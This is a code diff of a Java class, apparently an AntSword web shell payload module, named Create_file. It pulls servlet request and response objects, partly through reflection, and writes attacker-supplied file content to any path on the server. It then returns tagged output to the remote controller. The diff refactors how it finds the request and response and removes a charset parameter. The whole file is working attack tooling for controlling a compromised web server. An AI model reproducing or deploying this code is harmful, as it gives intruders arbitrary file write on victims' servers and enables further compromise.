@@ -1,6 +1,5 @@
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import javax.servlet.jsp.PageContext;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
@@ -15,34 +14,36 @@ public class Create_file {
 
     @Override
     public boolean equals(Object obj) {
-        if (obj instanceof PageContext) {
-            PageContext page = (PageContext) obj;
-            request = (HttpServletRequest) page.getRequest();
-            response = (HttpServletResponse) page.getResponse();
-        } else if (obj instanceof HttpServletRequest) {
-            request = (HttpServletRequest) obj;
-            try {
-                Field req = request.getClass().getDeclaredField("request");
-                req.setAccessible(true);
-                HttpServletRequest request2 = (HttpServletRequest) req.get(request);
-                Field resp = request2.getClass().getDeclaredField("response");
-                resp.setAccessible(true);
-                response = (HttpServletResponse) resp.get(request2);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+        try {
+            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+            request = (HttpServletRequest) clazz.getDeclaredMethod("getRequest").invoke(obj);
+            response = (HttpServletResponse) clazz.getDeclaredMethod("getResponse").invoke(obj);
+        } catch (Exception ex) {
+            if (obj instanceof HttpServletRequest) {
+                request = (HttpServletRequest) obj;
+                try {
+                    Field req = request.getClass().getDeclaredField("request");
+                    req.setAccessible(true);
+                    HttpServletRequest request2 = (HttpServletRequest) req.get(request);
+                    Field resp = request2.getClass().getDeclaredField("response");
+                    resp.setAccessible(true);
+                    response = (HttpServletResponse) resp.get(request2);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
 
-        } else if (obj instanceof HttpServletResponse) {
-            response = (HttpServletResponse) obj;
-            try {
-                Field resp = response.getClass().getDeclaredField("response");
-                resp.setAccessible(true);
-                HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
-                Field req = response2.getClass().getDeclaredField("request");
-                req.setAccessible(true);
-                request = (HttpServletRequest) req.get(response2);
-            } catch (Exception e) {
-                e.printStackTrace();
+            } else if (obj instanceof HttpServletResponse) {
+                response = (HttpServletResponse) obj;
+                try {
+                    Field resp = response.getClass().getDeclaredField("response");
+                    resp.setAccessible(true);
+                    HttpServletResponse response2 = (HttpServletResponse) resp.get(response);
+                    Field req = response2.getClass().getDeclaredField("request");
+                    req.setAccessible(true);
+                    request = (HttpServletRequest) req.get(response2);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
         }
         randomPrefix = "antswordrandomPrefix";
@@ -61,7 +62,7 @@ public class Create_file {
             String z1 = EC(decode(request.getParameter(varkey1) + ""));
             String z2 = EC(decode(request.getParameter(varkey2) + ""));
             output.append(tag_s);
-            sb.append(WriteFileCode(z1, z2, cs));
+            sb.append(WriteFileCode(z1, z2));
             output.append(sb.toString());
             output.append(tag_e);
             response.getWriter().print(output.toString());
@@ -115,9 +116,9 @@ public class Create_file {
         return str;
     }
 
-    String WriteFileCode(String filePath, String fileContext, String cs) throws Exception {
+    String WriteFileCode(String filePath, String fileContext) throws Exception {
         String h = "0123456789ABCDEF";
-        String fileHexContext = strtohexstr(fileContext, cs);
+        String fileHexContext = strtohexstr(fileContext);
         File f = new File(filePath);
         FileOutputStream os = new FileOutputStream(f);
         for (int i = 0; i < fileHexContext.length(); i += 2) {
@@ -127,7 +128,7 @@ public class Create_file {
         return "1";
     }
 
-    String strtohexstr(String fileContext, String cs) throws Exception {
+    String strtohexstr(String fileContext) throws Exception {
         String h = "0123456789ABCDEF";
         byte[] bytes = fileContext.getBytes(cs);
         StringBuilder sb = new StringBuilder(bytes.length * 2);
